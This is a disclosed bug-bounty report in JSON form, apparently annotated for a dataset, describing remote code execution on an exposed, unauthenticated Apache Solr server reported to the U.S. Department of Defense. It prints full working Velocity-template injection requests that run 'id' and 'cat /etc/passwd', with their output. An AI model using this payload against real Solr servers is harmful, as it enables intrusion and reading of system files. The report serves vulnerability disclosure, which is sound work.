{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "khizer47 ",
  "title": "Apache solr RCE via velocity template",
  "content": "\nHi team,\nWhile doing some recon i stumbled upon an IP address http://\u2588\u2588\u2588\u2588\u2588\u2588/ The IP took me to a Login Page at \u2588\u2588\u2588\u2588=https%3A%2F%2F\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nas of the URL suggest this system belongs to US gov.\nDoing a Port scan reveals that POST \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 is Open, A lot of doors open if Solr is exposed outside of a trusted network and without administrative authentication. and the solar instance was without any authentication http://\u2588\u2588\u2588\u2588:\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\nRunning a Query http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588:\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588: Showed data from http://\u2588\u2588\u2588\u2588\u2588\u2588.mil/ that's why i decided to report it here\nQuery output example:\nCode 4.11 KiB\n1\n2{\n3  \"responseHeader\":{\n4    \"status\":0,\n5    \"QTime\":0,\n6    \"params\":{\n7      \"q\":\"*:*\",\n8      \"_\":\"1584415352129\"}},\n9  \"response\":{\"numFound\":858,\"start\":0,\"docs\":[\n10      {\n11        \"id\":\"http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/instance/relations/locationRelLink#UNIT_TIE_\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\n12        \"type\":[\"http://\u2588\u2588\u2588.mil/ont/relations#LocationRelLink\"],\n13        \"base.has_link_from_geohash_12_ss\":[\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\"],\n14        \"base.has_link_to_geohash_12_ss\":[\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\"],\n15        \"base.has_metadata|has_metadata_MIDB-gmi_constraint.has_ownr_producer|US-@id_nidx_ss\":[\"http://\u2588\u2588\u2588.mil/ont/gmiConstraint/OwnrProducer#US\"],\n16        \"base.has_metadata|has_metadata_MIDB-base.is_metadata_of-@id_nidx_ss\":[\"http://\u2588\u2588\u2588\u2588\u2588.mil/instance/relations/locationRelLink#UNIT_TIE_\u2588\u2588\u2588\u2588\u2588\"],\n17        \"base.link_predicate|located_at-@id_nidx_ss\":[\"http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/ont/relations#located_at\"],\n18        \"base.has_metadata|has_metadata_MIDB-@type_nidx_ss\":[\"http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/ont/base#Metadata\"],\n19        \"base.has_metadata|has_metadata_MIDB-dc.source_nidx_ss\":[\"MIDB\"],\n20        \"base.link_to-@id_nidx_ss\":[\"http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/instance/base/facility#FAC_\u2588\u2588\u2588\"],\n21        \"base.has_metadata|has_metadata_MIDB-@id_nidx_ss\":[\"http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/instance/relations/locationRelLink#UNIT_TIE_\u2588\u2588\u2588\u2588\u2588\u2588_has_metadata_MIDB\"],\n22        \"base.link_from-@id_nidx_ss\":[\"http://\u2588\u2588\u2588\u2588\u2588.mil/instance/organization/unit#UNIT_\u2588\u2588\u2588\u2588\"],\n23        \"_version_\":1660996099434872832},\n24      {\n25        \"id\":\"http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/instance/base/equipment#\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\n26        \"type\":[\"http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/ont/base#Equipment\"],\n27        \"gmi_constraint.has_oper_status_ss\":[\"OPR\"],\n28        \"equipment.has_nomen|has_nomen_Switch-@type_nidx_ss\":[\"http://\u2588\u2588\u2588\u2588.mil/ont/base#DataQuality\"],\n29        \"base.has_location|has_location-base.has_location_name_nidx_ss\":[\"CISCO 3750\"],\n30        \"base.has_geo_data|has_geo_data-base.has_geo_metadata|has_geo_metadata_MIDB-base.is_metadata_of-@id_nidx_ss\":[\"http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/instance/base/equipment#\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588_has_geo_data\"],\n31        \"base.has_geo_data|has_geo_data-base.has_metadata|has_metadata_MIDB-@id_nidx_ss\":[\"http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/instance/base/equipment#\u2588\u2588\u2588\u2588_has_geo_data_has_metadata_MIDB\"],\n32        \"base.has_metadata|has_metadata_MIDB-dc.source_nidx_ss\":[\"MIDB\"],\n33        \"base.has_country_code|has_country_code_US-base.has_quality_value_nidx_ss\":[\"US\"],\n34        \"gmi_constraint.has_condition|has_condition_RDY-@id_nidx_ss\":[\"http://\u2588\u2588\u2588\u2588\u2588.mil/instance/base/equipment#\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588_has_condition_RDY\"],\n35        \"base.has_geo_data|has_geo_data-@type_nidx_ss\":[\"http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/ont/base#GeoDataQuality\"],\n36        \"base.has_country_code_ss\":[\"US\"],\n37        \"gmi_constraint.has_condition|has_condition_RDY-base.has_quality_value_nidx_ss\":[\"RDY\"],\n38        \"base.has_geo_data|has_geo_data-base.has_geo_metadata|has_geo_metadata_MIDB-@type_nidx_ss\":[\"http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/ont/base#GeoMetadata\"],\n39        \"equipment.has_nomen|has_nomen_Switch-base.has_metadata|has_metadata_MIDB-dc.source_nidx_ss\":[\"MIDB\"],\n40        \"gmi_constraint.has_condition|has_condition_RDY-base.quality_of-@id_nidx_ss\":[\"http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/instance/base/equipment#\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\"],\n41        \"gmi_constraint.has_condition_ss\":[\"RDY\"],\n42        \"info.has_graphic|has_graphic-@id_nidx_ss\":[\"http://\u2588\u2588\u2588.mil/instance/base/equipment#\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588_has_graphic\"],\n43        \"gmi_constraint.has_condition|has_condition_RDY-base.has_metadata|has_metadata_MIDB-@type_nidx_ss\":[\"http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/ont/base#Metadata\"],\n44        \"gmi_constraint.has_oper_status|has_oper_status_OPR-base.has_metadata|has_metadata_MIDB-@id_nidx_ss\":[\"http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/instance/base/equipment#\u2588\u2588\u2588\u2588\u2588\u2588\u2588_has_oper_status_OPR_has_metadata_MIDB\"],\n45        \"gmi_constraint.has_oper_status|has_oper_status_OPR-base.quality_of-@id_nidx_ss\":[\"http://\u2588\u2588\u2588\u2588\u2588\u2588.mil/instance/base/equipment#\u2588\u2588\u2588\u2588\"],\n46        \"gmi_constraint.has_oper_status|has_oper_status_OPR-base.has_quality_value_enum|OPR-@id_nidx_ss\":[\"http://\u2588\u2588\u2588.mil/ont/gmiConstraint/OperStatus#OPR\"],\n47        \"gmi_constraint.has_oper_status|has_oper_status_OPR-base.has_metadata|has_metadata_MIDB-base.is_metadata_of-@id_nidx_ss\":[\"http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/instance/base/equipment#\u2588\u2588\u2588\u2588_has_oper_status_OPR\"],\n48        \"base.has_country_code|has_country_code_US-base.has_metadata|has_met\nAnd the Solar Instance is Vulnuberal to RCE via via velocity template\nRequest:\nCode 744 Bytes\n1GET \u2588\u2588\u25881&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588:\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0\n4Accept: application/json, text/plain, */*\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7X-Requested-With: XMLHttpRequest\n8Connection: close\n9Referer: http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588:\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/solr/\nResponse:\nCode 150 Bytes\n1HTTP/1.1 200 OK\n2Connection: close\n3Content-Type: text/html;charset=utf-8\n4Content-Length: 51\n5\n6 0 uid=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588(solr) gid=\u2588\u2588\u2588\u2588(solr) groups=\u2588\u2588\u2588\u2588\u2588\u2588(solr)\n\u2588\u2588\u2588\nRequest:\nCode 750 Bytes\n1GET \u2588\u2588\u2588\u2588\u25881&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27cat%20/etc/passwd%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588:\u2588\u2588\u2588\u2588\u2588\n3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0\n4Accept: application/json, text/plain, */*\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7X-Requested-With: XMLHttpRequest\n8Connection: close\n9Referer: http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588:\u2588\u2588\u2588\u2588\u2588\u2588/solr/\nResponse:\nCode 1.02 KiB\n1HTTP/1.1 200 OK\n2Connection: close\n3Content-Type: text/html;charset=utf-8\n4Content-Length: 952\n5\n6 0 root:x:0:0:root:/root:/bin/bash\n7daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n8bin:x:2:2:bin:/bin:/usr/sbin/nologin\n9sys:x:3:3:sys:/dev:/usr/sbin/nologin\n10sync:x:4:65534:sync:/bin:/bin/sync\n11games:x:5:60:games:/usr/games:/usr/sbin/nologin\n12man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n13lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n14mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n15news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n16uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n17proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n18www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n19backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n20list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n21irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\n22gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n23nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n24_apt:x:100:65534::/nonexistent:/bin/false\n25solr:x:\u2588\u2588\u2588\u2588\u2588\u2588\u2588:\u2588\u2588\u2588::/home/solr:\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nIt is recommended to firewall Solr and enable authentication for all requests.\nImpact\nRemote Code Execution\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1610506140,
  "report_url": "https://hackerone.com/reports/822002",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Identify an exposed Apache Solr instance without authentication by scanning ports or discovering it during reconnaissance."
    ],
    [
      2,
      "Exploit the Velocity template vulnerability by sending a crafted GET request to the Solr instance with a malicious Velocity template that executes arbitrary commands (e.g., 'id' or 'cat /etc/passwd')."
    ]
  ],
  "vuln_description": "The vulnerability is a Remote Code Execution (RCE) in Apache Solr via a Velocity template. An attacker can execute arbitrary commands on the server due to improper input validation and lack of authentication.",
  "reason": "The attack involves a single component (the Solr instance) and a well-documented exploit (Velocity template RCE). The steps are straightforward and do not require complex interactions or state manipulation.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The vulnerability involves an unauthenticated Apache Solr instance exposed to the internet, allowing remote code execution via Velocity template injection. This is not an authentication or authorization bypass within the same application context but rather a misconfiguration leading to RCE. The proposed methodologies focus on testing authorization boundaries within the same application by swapping user sessions and resource IDs, which does not apply here.",
    "is_detectable": false
  },
  "injection_metadata": {
    "reasoning": "The vulnerability involves injecting a Velocity template via the `v.template.custom` parameter in a GET request, which is detectable in the HTTP response. The payload is a straightforward Java code execution (e.g., `id`, `cat /etc/passwd`) without requiring custom bypasses. Since the parameter is part of the request and the RCE output appears directly in the same HTTP response, it aligns with the methodology's 'simple payload' criteria and same-channel detection. However, this assumes the parameter was logged during regular navigation (e.g., accessing Solr's admin interface) and included in testing.",
    "is_simple_injection": true
  }
}